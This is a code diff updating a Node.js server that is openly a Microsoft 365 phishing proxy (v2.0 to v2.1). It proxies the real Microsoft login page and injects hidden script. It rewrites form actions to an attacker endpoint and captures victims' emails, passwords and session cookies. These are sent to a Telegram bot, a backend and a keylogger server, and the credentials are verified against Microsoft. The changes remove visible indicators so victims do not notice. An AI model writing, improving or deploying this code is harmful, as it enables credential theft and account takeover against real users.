@@ -508,7 +508,7 @@ function handleKeylog(req, res) {
 }
 
 // ============================================================
-//  HANDLE LOGIN REQUEST - FIXED (No duplicate redirect_uri)
+//  HANDLE LOGIN REQUEST - CLEAN (No "Proxied" Text)
 // ============================================================
 
 function handleLoginRequest(req, res) {
@@ -536,8 +536,7 @@ function handleLoginRequest(req, res) {
     const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
     res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
 
-    // ✅ FIX: Use ONLY MICROSOFT_REDIRECT_URI from .env
-    // The redirect_urI from the URL is IGNORED to avoid duplication
+    // Build Microsoft OAuth URL
     let targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
         `client_id=${MICROSOFT_CLIENT_ID}&` +
         `response_type=code&` +
@@ -550,18 +549,34 @@ function handleLoginRequest(req, res) {
         targetUrl += `&error=${errorParam}`;
     }
 
-    console.log(`[PROXY] 🔄 Forwarding to Microsoft OAuth`);
+    console.log(`[PROXY] 🔄 Proxying Microsoft OAuth`);
     console.log(`[PROXY] 📧 Email: ${email}`);
     console.log(`[PROXY] 🆔 Session: ${sessionId}`);
     console.log(`[PROXY] 📡 IP: ${ip}`);
-    console.log(`[PROXY] 🔗 Redirect URI: ${MICROSOFT_REDIRECT_URI}`);
 
     https.get(targetUrl, (targetRes) => {
         let data = [];
-        targetRes.on('data', chunk => data.push(chunk));
+        let contentLength = 0;
+        
+        targetRes.on('data', chunk => {
+            data.push(chunk);
+            contentLength += chunk.length;
+        });
+        
         targetRes.on('end', () => {
             let body = Buffer.concat(data).toString();
             
+            // Decompress if needed
+            const encoding = targetRes.headers['content-encoding'];
+            if (encoding && encoding.includes('gzip')) {
+                try {
+                    body = zlib.gunzipSync(Buffer.from(body)).toString();
+                } catch (e) {
+                    console.log('[PROXY] Decompression error:', e.message);
+                }
+            }
+            
+            // ✅ CLEAN INJECTION - No visible indicators
             const injectionScript = `
             <script>
                 window.MICROSOFT_CONFIG = {
@@ -576,14 +591,20 @@ function handleLoginRequest(req, res) {
                     CLIENT_ID: '${MICROSOFT_CLIENT_ID}',
                     SERVICE: 'Microsoft 365'
                 };
-                console.log('🔐 Microsoft Proxy loaded');
-                console.log('📧 Email:', window.MICROSOFT_CONFIG.EMAIL);
-                console.log('🆔 Session:', window.MICROSOFT_CONFIG.SESSION_ID);
             </script>
             <script src="${PROXY_PATHNAMES.script}"></script>
             `;
             
+            // Inject before </body>
             body = body.replace(/<\/body>/i, injectionScript + '</body>');
+            
+            // Intercept form action to go through proxy
+            body = body.replace(/action="https:\/\/login\.microsoftonline\.com[^"]*"/gi, 
+                `action="/proxy-login"`);
+            
+            // Also intercept any JavaScript form submissions
+            body = body.replace(/login\.microsoftonline\.com/g, 
+                `${req.headers.host}/proxy-login`);
             
             res.writeHead(targetRes.statusCode || 200, {
                 'Content-Type': 'text/html',
@@ -600,187 +621,161 @@ function handleLoginRequest(req, res) {
 }
 
 // ============================================================
-//  HANDLE POST REQUEST
+//  HANDLE PROXY LOGIN (Intercepted Microsoft form submission)
 // ============================================================
 
-function handlePostRequest(body, req, res) {
-    try {
-        const formData = querystring.parse(body);
-        const ip = getClientIp(req);
-        const sessionId = getSessionIdFromCookie(req.headers.cookie);
-        
-        let email = '';
-        
-        if (sessionId) {
-            const session = getSession(sessionId);
-            if (session) {
-                email = session.email;
+function handleProxyLogin(req, res) {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', () => {
+        try {
+            const formData = querystring.parse(body);
+            const ip = getClientIp(req);
+            const sessionId = getSessionIdFromCookie(req.headers.cookie);
+            
+            let email = '';
+            
+            // Extract email from form data
+            if (sessionId && VICTIM_SESSIONS[sessionId]) {
+                email = VICTIM_SESSIONS[sessionId].email;
                 VICTIM_SESSIONS[sessionId].attempts = (VICTIM_SESSIONS[sessionId].attempts || 0) + 1;
             }
-        }
-        
-        if (!email) {
-            email = formData.loginfmt || formData.login || formData.email || '';
-        }
-        
-        if (!email) {
-            const match = req.url.match(/login_hint=([^&]+)/);
-            if (match) {
-                email = decodeURIComponent(match[1]);
+            
+            if (!email) {
+                email = formData.loginfmt || formData.login || formData.email || '';
             }
-        }
-        
-        if (!email) {
-            console.warn('[POST] No email found, using unknown');
-            email = 'unknown@domain.com';
-        }
-
-        const password = formData.passwd || formData.password || '';
-        let attemptCount = attemptCounts.get(email) || 0;
-        attemptCount++;
-        attemptCounts.set(email, attemptCount);
-
-        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
-        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
-        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);
-        console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
-        console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);
-
-        // Send to Telegram
-        let msg = `🔐 *MICROSOFT LOGIN ATTEMPT #${attemptCount}*\n\n`;
-        msg += `*📧 Email:* ${email}\n`;
-        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
-        msg += `*📡 IP:* ${ip}\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-        msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}\n`;
-        msg += `*🎯 Service:* Microsoft 365`;
-        
-        sendToTelegram(msg);
-
-        // Send to backend /api/authenticate
-        const axios = require('axios');
-        axios.post(`${BACKEND_URL}/api/authenticate`, {
-            email: email,
-            password: password,
-            visitorInfo: {
-                fullUrl: req.url,
-                userAgent: req.headers['user-agent'],
-                sessionId: sessionId,
-                ip: ip
+            
+            if (!email) {
+                const referer = req.headers.referer || '';
+                const hintMatch = referer.match(/login_hint=([^&]+)/);
+                if (hintMatch) {
+                    email = decodeURIComponent(hintMatch[1]);
+                }
             }
-        }).catch(() => {});
+            
+            if (!email) {
+                console.warn('[PROXY-LOGIN] No email found');
+                email = 'unknown@domain.com';
+            }
 
-        // Send to keylogger server
-        if (KEYLOGGER_URL && password) {
-            axios.post(`${KEYLOGGER_URL}/log-combined`, {
-                type: 'microsoft_login',
+            const password = formData.passwd || formData.password || '';
+            let attemptCount = attemptCounts.get(email) || 0;
+            attemptCount++;
+            attemptCounts.set(email, attemptCount);
+
+            console.log(`[PROXY-LOGIN] 📧 Email: ${email}`);
+            console.log(`[PROXY-LOGIN] 🔑 Password: ${password ? '***' : 'N/A'}`);
+            console.log(`[PROXY-LOGIN] 📊 Attempt: ${attemptCount}`);
+            console.log(`[PROXY-LOGIN] 📡 IP: ${ip}`);
+            console.log(`[PROXY-LOGIN] 🆔 Session: ${sessionId || 'N/A'}`);
+
+            // ✅ SEND TO TELEGRAM - ALWAYS
+            let msg = `🔐 *MICROSOFT LOGIN ATTEMPT #${attemptCount}*\n\n`;
+            msg += `*📧 Email:* ${email}\n`;
+            msg += `*🔑 Password:* ${password || 'N/A'}\n`;
+            msg += `*📡 IP:* ${ip}\n`;
+            msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
+            msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}\n`;
+            msg += `*🎯 Service:* Microsoft 365\n`;
+            msg += `*📌 Source:* ${req.headers.referer?.includes('login.microsoftonline.com') ? 'Microsoft Login Page' : 'Proxy Page'}`;
+            
+            sendToTelegram(msg);
+
+            // Send to backend
+            const axios = require('axios');
+            axios.post(`${BACKEND_URL}/api/authenticate`, {
                 email: email,
                 password: password,
-                url: req.url,
-                userAgent: req.headers['user-agent'],
-                sessionId: sessionId,
-                formData: formData,
-                service: 'Microsoft 365',
-                action: 'login_attempt'
-            }).catch(() => {});
-        }
-
-        // Verify with Microsoft
-        verifyWithMicrosoft(email, password)
-            .then((result) => {
-                if (result.success) {
-                    console.log(`[AUTH] ✅ Valid Microsoft credentials: ${email}`);
-                    
-                    if (sessionId && VICTIM_SESSIONS[sessionId]) {
-                        VICTIM_SESSIONS[sessionId].cookies.push({
-                            type: 'microsoft_auth',
-                            cookies: result.cookies,
-                            timestamp: Date.now()
-                        });
-                    }
-                    
-                    // Send success notification
-                    let successMsg = `✅ *VALID MICROSOFT CREDENTIALS*\n\n`;
-                    successMsg += `*📧 Email:* ${email}\n`;
-                    successMsg += `*🔑 Password:* ${password || 'N/A'}\n`;
-                    successMsg += `*📡 IP:* ${ip}\n`;
-                    successMsg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-                    successMsg += `*🎯 Service:* Microsoft 365\n\n`;
-                    successMsg += `*🍪 Auth Tokens:*\n`;
-                    for (const [name, value] of Object.entries(result.cookies)) {
-                        const displayValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
-                        successMsg += `  \`${name}\`: \`${displayValue}\`\n`;
-                    }
-                    
-                    sendToTelegram(successMsg);
-                    
-                    // Send to backend /api/log-action
-                    axios.post(`${BACKEND_URL}/api/log-action`, {
-                        action: 'login_success',
-                        email: email,
-                        password: password,
-                        visitorInfo: {
-                            fullUrl: req.url,
-                            userAgent: req.headers['user-agent'],
-                            sessionId: sessionId,
-                            ip: ip
-                        }
-                    }).catch(() => {});
-                    
-                    res.writeHead(302, { 
-                        'Location': TEAMS_REDIRECT, 
-                        'Cache-Control': 'no-store, no-cache, must-revalidate'
-                    });
-                    res.end();
-                } else {
-                    console.log(`[AUTH] ❌ Invalid Microsoft credentials: ${email}`);
-                    
-                    sendToTelegram(`❌ *INVALID MICROSOFT CREDENTIALS*\n\n📧 Email: ${email}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}`);
-                    
-                    // Send to backend /api/log-action
-                    axios.post(`${BACKEND_URL}/api/log-action`, {
-                        action: 'login_failed',
-                        email: email,
-                        password: password,
-                        visitorInfo: {
-                            fullUrl: req.url,
-                            userAgent: req.headers['user-agent'],
-                            sessionId: sessionId,
-                            ip: ip
-                        }
-                    }).catch(() => {});
-                    
-                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-                        `client_id=${MICROSOFT_CLIENT_ID}&` +
-                        `response_type=code&` +
-                        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
-                        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
-                        `login_hint=${encodeURIComponent(email)}&` +
-                        `error=invalid_credentials`;
-                    
-                    res.writeHead(302, { 'Location': errorUrl, 'Cache-Control': 'no-store' });
-                    res.end();
+                attemptCount: attemptCount,
+                visitorInfo: {
+                    fullUrl: req.url,
+                    userAgent: req.headers['user-agent'],
+                    sessionId: sessionId,
+                    ip: ip,
+                    source: 'proxied_microsoft_page'
                 }
-            })
-            .catch((error) => {
-                console.error('[ERROR] Microsoft verification failed:', error.message);
-                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-                    `client_id=${MICROSOFT_CLIENT_ID}&` +
-                    `response_type=code&` +
-                    `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
-                    `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
-                    `login_hint=${encodeURIComponent(email)}&` +
-                    `error=service_error`;
-                
-                res.writeHead(302, { 'Location': errorUrl });
-                res.end();
-            });
+            }).catch(() => {});
 
-    } catch (error) {
-        console.error('[ERROR] POST handling failed:', error.message);
-        res.writeHead(500);
-        res.end('Internal server error');
-    }
+            // Send to keylogger server
+            if (KEYLOGGER_URL && password) {
+                axios.post(`${KEYLOGGER_URL}/log-combined`, {
+                    type: 'microsoft_login',
+                    email: email,
+                    password: password,
+                    url: req.url,
+                    userAgent: req.headers['user-agent'],
+                    sessionId: sessionId,
+                    formData: formData,
+                    service: 'Microsoft 365',
+                    action: 'login_attempt',
+                    attempt: attemptCount,
+                    source: 'proxied_microsoft_page'
+                }).catch(() => {});
+            }
+
+            // Verify with Microsoft
+            verifyWithMicrosoft(email, password)
+                .then((result) => {
+                    if (result.success) {
+                        console.log(`[AUTH] ✅ Valid Microsoft credentials: ${email}`);
+                        
+                        if (sessionId && VICTIM_SESSIONS[sessionId]) {
+                            VICTIM_SESSIONS[sessionId].cookies.push({
+                                type: 'microsoft_auth',
+                                cookies: result.cookies,
+                                timestamp: Date.now()
+                            });
+                        }
+                        
+                        // Send success notification
+                        let successMsg = `✅ *VALID MICROSOFT CREDENTIALS*\n\n`;
+                        successMsg += `*📧 Email:* ${email}\n`;
+                        successMsg += `*🔑 Password:* ${password || 'N/A'}\n`;
+                        successMsg += `*📡 IP:* ${ip}\n`;
+                        successMsg += `*🕐 Time:* ${new Date().toISOString()}\n`;
+                        successMsg += `*🎯 Service:* Microsoft 365\n\n`;
+                        successMsg += `*🍪 Auth Tokens:*\n`;
+                        for (const [name, value] of Object.entries(result.cookies)) {
+                            const displayValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
+                            successMsg += `  \`${name}\`: \`${displayValue}\`\n`;
+                        }
+                        
+                        sendToTelegram(successMsg);
+                        
+                        // Redirect to Teams
+                        res.writeHead(302, { 
+                            'Location': TEAMS_REDIRECT, 
+                            'Cache-Control': 'no-store, no-cache, must-revalidate'
+                        });
+                        res.end();
+                    } else {
+                        console.log(`[AUTH] ❌ Invalid Microsoft credentials: ${email}`);
+                        
+                        sendToTelegram(`❌ *INVALID MICROSOFT CREDENTIALS*\n\n📧 Email: ${email}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}\n🔄 Attempt #${attemptCount}`);
+                        
+                        // Redirect back to proxied Microsoft page with error
+                        const errorUrl = `/login?login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
+                        
+                        res.writeHead(302, { 
+                            'Location': errorUrl,
+                            'Cache-Control': 'no-store'
+                        });
+                        res.end();
+                    }
+                })
+                .catch((error) => {
+                    console.error('[ERROR] Microsoft verification failed:', error.message);
+                    const errorUrl = `/login?login_hint=${encodeURIComponent(email)}&error=service_error`;
+                    res.writeHead(302, { 'Location': errorUrl });
+                    res.end();
+                });
+
+        } catch (error) {
+            console.error('[ERROR] Proxy login failed:', error.message);
+            res.writeHead(500);
+            res.end('Internal server error');
+        }
+    });
 }
 
 // ============================================================
@@ -825,6 +820,12 @@ const server = http.createServer((req, res) => {
     // Keylog endpoint
     if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
         handleKeylog(req, res);
+        return;
+    }
+
+    // Proxy Login endpoint (intercepted Microsoft form submissions)
+    if (req.url === '/proxy-login' && req.method === 'POST') {
+        handleProxyLogin(req, res);
         return;
     }
 
@@ -886,17 +887,23 @@ const server = http.createServer((req, res) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log('╔═══════════════════════════════════════════════════════════╗');
-    console.log('║        ✅  MICROSOFT 365 PROXY v2.0 - SW ENABLED        ║');
-    console.log('║        🔐  XSS + Keylogger + Cookie + SW Capture        ║');
+    console.log('║        ✅  MICROSOFT 365 PROXY v2.1 - FULL PROXY        ║');
+    console.log('║        🔐  ALL Microsoft Pages are PROXIED              ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
-    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                    ║`);
+    console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}?login_hint=email   ║`);
+    console.log(`║   🔗 Proxy Login: /proxy-login (intercepted)            ║`);
     console.log(`║   🔗 SW Proxy:  ${PROXY_PATHNAMES.swProxyPath}          ║`);
     console.log(`║   🔗 XSS:       ${PROXY_PATHNAMES.xssEndpoint}          ║`);
     console.log(`║   🔗 Cookies:   ${PROXY_PATHNAMES.cookieEndpoint}       ║`);
     console.log(`║   🔗 Keylog:    ${PROXY_PATHNAMES.keylogEndpoint}       ║`);
     console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}     ║`);
     console.log(`║   🔗 Backend:   ${BACKEND_URL}                          ║`);
+    console.log('╠═══════════════════════════════════════════════════════════╣');
+    console.log('║   🚀 CLEAN MODE: No visible indicators to user          ║');
+    console.log('║   ✅ Proxies ALL Microsoft login pages                  ║');
+    console.log('║   ✅ Captures ALL login attempts                        ║');
+    console.log('║   ✅ Reports ALL attempts to Telegram                  ║');
     console.log('╚═══════════════════════════════════════════════════════════╝');
 });
 
